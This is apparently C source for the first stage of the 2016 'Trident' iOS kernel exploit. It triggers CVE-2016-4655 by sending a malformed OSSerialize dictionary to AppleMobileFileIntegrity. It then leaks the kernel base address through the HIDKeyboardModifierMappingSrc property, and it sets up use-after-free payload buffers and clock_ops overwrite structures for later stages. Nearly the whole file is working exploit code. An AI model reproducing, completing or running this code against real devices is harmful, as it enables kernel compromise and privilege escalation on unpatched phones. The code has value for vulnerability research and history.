//
//  exploit.c
//  Trident
//
//  Created by Benjamin Randazzo on 06/11/2016.
//  Copyright Â© 2016 Benjamin Randazzo. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>

#include <pthread.h>

#include <sys/syscall.h>
#include <sys/kauth.h>
#include <sys/stat.h>

#include <mach/mach.h>

#include <IOKit/IOKitLib.h>

#include "offsetfinder.h"

#include <dlfcn.h>
#include <asl.h>


enum
{
    kOSSerializeDictionary   = 0x01000000U,
    kOSSerializeArray        = 0x02000000U,
    kOSSerializeSet          = 0x03000000U,
    kOSSerializeNumber       = 0x04000000U,
    kOSSerializeSymbol       = 0x08000000U,
    kOSSerializeString       = 0x09000000U,
    kOSSerializeData         = 0x0a000000U,
    kOSSerializeBoolean      = 0x0b000000U,
    kOSSerializeObject       = 0x0c000000U,
    kOSSerializeTypeMask     = 0x7F000000U,
    kOSSerializeDataMask     = 0x00FFFFFFU,
    kOSSerializeEndCollecton = 0x80000000U,
};

#define kOSSerializeBinarySignature "\323\0\0"


#define WRITE_IN(buf, data) do { *(uint32_t *)(buf+bufpos) = (data); bufpos+=4; } while(0)

typedef void* (*dlopen_ptr)(const char *filename, int flags);
typedef void* (*dlsym_ptr)(void *handle, const char *symbol);
static dlopen_ptr dlopen_func = 0;
static dlsym_ptr dlsym_func = 0;

#define TTB_SIZE            4096

#define L1_SECT_S_BIT       (1 << 16)
#define L1_SECT_PROTO       (1 << 1)        /* 0b10 */
#define L1_SECT_AP_URW      (1 << 10) | (1 << 11)
#define L1_SECT_APX         (1 << 15)
#define L1_SECT_DEFPROT     (L1_SECT_AP_URW | L1_SECT_APX)
#define L1_SECT_SORDER      (0)            /* 0b00, not cacheable, strongly ordered. */
#define L1_SECT_DEFCACHE    (L1_SECT_SORDER)
#define L1_PROTO_TTE(entry) (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)

#define L1_PAGE_PROTO       (1 << 0)
#define L1_COARSE_PT        (0xFFFFFC00)

#define PT_SIZE             256

#define L2_PAGE_APX         (1 << 9)

static char *lockfile;
static int fd;

static int fildes[2];
static uint32_t cpipe;
static uint32_t pipebuf;

static clock_serv_t clk_battery;
static clock_serv_t clk_realtime;

unsigned char clock_ops_overwrite[] = {
    0x00, 0x00, 0x00, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
    0x00, 0x00, 0x00, 0x00, // [04] (calend_config): NULL
    0x00, 0x00, 0x00, 0x00, // [08] (calend_init): NULL
    0x00, 0x00, 0x00, 0x00, // [0C] (calend_gettime): address of calend_gettime (+1)
    0x00, 0x00, 0x00, 0x00, // [10] (calend_getattr): address of _bufattr_cpx (+1)
};

unsigned char uaf_payload_buffer[] = {
    0x00, 0x00, 0x00, 0x00, // [00] ptr to clock_ops_overwrite buffer
    0x00, 0x00, 0x00, 0x00, // [04] address of clock_ops array in kern memory
    0x00, 0x00, 0x00, 0x00, // [08] address of _copyin
    0x00, 0x00, 0x00, 0x00, // [0C] NULL
    0x00, 0x00, 0x00, 0x00, // [10] address of OSSerializer::serialize (+1)
    0x00, 0x00, 0x00, 0x00, // [14] address of "BX LR" code fragment
    0x00, 0x00, 0x00, 0x00, // [18] NULL
    0x00, 0x00, 0x00, 0x00, // [1C] address of OSSymbol::getMetaClass (+1)
    0x00, 0x00, 0x00, 0x00, // [20] address of "BX LR" code fragment
    0x00, 0x00, 0x00, 0x00, // [24] address of "BX LR" code fragment
};

unsigned char pExploit[128];

#define PAYLOAD_TO_PEXPLOIT (-76)
#define PEXPLOIT_TO_UAF_PAYLOAD 8

vm_offset_t vm_kernel_addrperm;

uint32_t write_gadget; // address of "str r1, [r0, #0xc] ; bx lr"



void init_exploit(void * dlsym_addr, void * dlopen_addr)
{
  dlopen_func = dlopen_addr;
  dlsym_func = dlsym_addr;

  // Lookup functions
  void* libsystem = dlopen_func("/usr/lib/libSystem.B.dylib", RTLD_NOW);

  typedef int (*asl_log_ptr)(aslclient asl, aslmsg msg, int level, const char *format, ...);
  asl_log_ptr asl_log_func = dlsym_func(libsystem, "asl_log");

  typedef void* (*memcpy_ptr)( void * destination, const void * source, size_t num);
  memcpy_ptr memcpy_func = dlsym_func(libsystem, "memcpy");

  void* libIOKit = dlopen_func("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_NOW);

  typedef CFMutableDictionaryRef (*IOServiceMatching_ptr)(const char *name);
  IOServiceMatching_ptr IOServiceMatching_func = dlsym_func(libIOKit, "IOServiceMatching");

  typedef io_service_t (*IOServiceGetMatchingService_ptr)(mach_port_t masterPort, CFDictionaryRef matching);
  IOServiceGetMatchingService_ptr IOServiceGetMatchingService_func = dlsym_func(libIOKit, "IOServiceGetMatchingService");

  typedef mach_port_t (*mach_task_self_ptr)();
  mach_task_self_ptr mach_task_self_func = dlsym_func(libIOKit, "mach_task_self");

  typedef kern_return_t (*io_service_open_extended_ptr)(mach_port_t service, task_t owningTask, uint32_t connect_type, NDR_record_t ndr, io_buf_ptr_t properties, mach_msg_type_number_t propertiesCnt, kern_return_t *result, mach_port_t *connection);
  io_service_open_extended_ptr io_service_open_extended_func = dlsym_func(libIOKit, "io_service_open_extended");

  typedef kern_return_t (*IORegistryEntryGetChildIterator_ptr)(io_registry_entry_t entry, const io_name_t plane, io_iterator_t *iterator);
  IORegistryEntryGetChildIterator_ptr IORegistryEntryGetChildIterator_func = dlsym_func(libIOKit, "IORegistryEntryGetChildIterator");

  typedef kern_return_t (*IOObjectRelease_ptr)(io_object_t object);
  IOObjectRelease_ptr IOObjectRelease_func = dlsym_func(libIOKit, "IOObjectRelease");

  typedef io_object_t (*IOIteratorNext_ptr)(io_iterator_t iterator);
  IOIteratorNext_ptr IOIteratorNext_func = dlsym_func(libIOKit, "IOIteratorNext");

  typedef kern_return_t (*IORegistryEntryGetProperty_ptr)(io_registry_entry_t entry, const io_name_t propertyName, io_struct_inband_t buffer, uint32_t *size);
  IORegistryEntryGetProperty_ptr IORegistryEntryGetProperty_func = dlsym_func(libIOKit, "IORegistryEntryGetProperty");


#define DLSYM_FUNC(func, library, return_type, args...) \
  typedef return_type (*func##_ptr)(args); \
  func##_ptr func##_func = dlsym_func(library, #func); \
  asl_log_func(0, 0, ASL_LEVEL_ERR, "function %s = %p!\n", #func, func##_func);

  DLSYM_FUNC(malloc, libsystem, void*, size_t)
  DLSYM_FUNC(getenv, libsystem, char*, const char*)
  DLSYM_FUNC(strcpy, libsystem, char*, char*, const char*)
  DLSYM_FUNC(strcat, libsystem, char*, char*, const char*)
  DLSYM_FUNC(strlen, libsystem, size_t, const char*)
  DLSYM_FUNC(open, libsystem, int, const char*, int flags, mode_t mode)
  DLSYM_FUNC(flock, libsystem, int, int fd, int operation)
  DLSYM_FUNC(pipe, libsystem, int, int* pipefd)
  DLSYM_FUNC(mach_host_self, libsystem, host_name_port_t)
  DLSYM_FUNC(host_get_clock_service, libsystem, kern_return_t, host_t host, clock_id_t id, clock_t clock_name);

  // Init
  const char *lock_last_path_component = "/tmp/lock";
  char *home = getenv_func("HOME");

  size_t locklen = strlen_func(home) + strlen_func(lock_last_path_component) + 1;
  lockfile = malloc_func(locklen);
  strcpy_func(lockfile, home);
  strcat_func(lockfile, lock_last_path_component);

  fd = open_func(lockfile, O_CREAT | O_WRONLY, 0644);

  flock_func(fd, LOCK_EX);
  pipe_func(fildes);

  kern_return_t kr;
  kr = host_get_clock_service_func(mach_host_self_func(), CALENDAR_CLOCK, &clk_battery);
  /*if (kr != KERN_SUCCESS) {*/
    /*printf("err: %d\n", err_get_code(kr));*/
  /*}*/

  kr = host_get_clock_service_func(mach_host_self_func(), REALTIME_CLOCK, &clk_realtime);
  /*if (kr != KERN_SUCCESS) {*/
    /*printf("err: %d\n", err_get_code(kr));*/
  /*}*/
 
  // CVE-2016-4655
  char data[4096];
  uint32_t bufpos = 0;

  memcpy_func(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
  bufpos += sizeof(kOSSerializeBinarySignature);

  WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollecton | 2);

  WRITE_IN(data, kOSSerializeSymbol | 30);
  WRITE_IN(data, 0x4b444948); // "HIDKeyboardModifierMappingSrc"
  WRITE_IN(data, 0x6f627965);
  WRITE_IN(data, 0x4d647261);
  WRITE_IN(data, 0x6669646f);
  WRITE_IN(data, 0x4d726569);
  WRITE_IN(data, 0x69707061);
  WRITE_IN(data, 0x7253676e);
  WRITE_IN(data, 0x00000063);
  WRITE_IN(data, kOSSerializeNumber | 2048);
  WRITE_IN(data, 0x00000004);
  WRITE_IN(data, 0x00000000);

  WRITE_IN(data, kOSSerializeSymbol | 30);
  WRITE_IN(data, 0x4b444948); // "HIDKeyboardModifierMappingDst"
  WRITE_IN(data, 0x6f627965);
  WRITE_IN(data, 0x4d647261);
  WRITE_IN(data, 0x6669646f);
  WRITE_IN(data, 0x4d726569);
  WRITE_IN(data, 0x69707061);
  WRITE_IN(data, 0x7344676e);
  WRITE_IN(data, 0x00000074);
  WRITE_IN(data, kOSSerializeNumber | kOSSerializeEndCollecton | 32);
  WRITE_IN(data, 0x00000193);
  WRITE_IN(data, 0X00000000);

  CFMutableDictionaryRef amfi = IOServiceMatching_func("AppleMobileFileIntegrity");
  io_service_t service = IOServiceGetMatchingService_func(0, amfi);
  io_connect_t connection;
  kern_return_t result;

  NDR_record_t* NDR_record_lookup = dlsym_func(libIOKit, "NDR_record");

  io_service_open_extended_func(service, mach_task_self_func(), 0, *NDR_record_lookup, data, bufpos, &result, &connection);
  if (result != KERN_SUCCESS) {
    /*asl_log_func(0, 0, ASL_LEVEL_ERR, "error!\n");*/
  }

  io_object_t object = 0;
  uint32_t size = sizeof(data);
  io_iterator_t iterator;
  IORegistryEntryGetChildIterator_func(service, "IOService", &iterator);

  do {
    if (object) {
      IOObjectRelease_func(object);
    }
    object = IOIteratorNext_func(iterator);
  } while (IORegistryEntryGetProperty_func(object, "HIDKeyboardModifierMappingSrc", data, &size));

  uint32_t kernel_base = 0;
  if (size > 8) {
    kernel_base = (*(uint32_t *)(data+36) & 0xFFF00000) + 0x1000;
  }

  asl_log_func(0, 0, ASL_LEVEL_ERR, "kernel_base %p!\n", (void*)kernel_base);
}


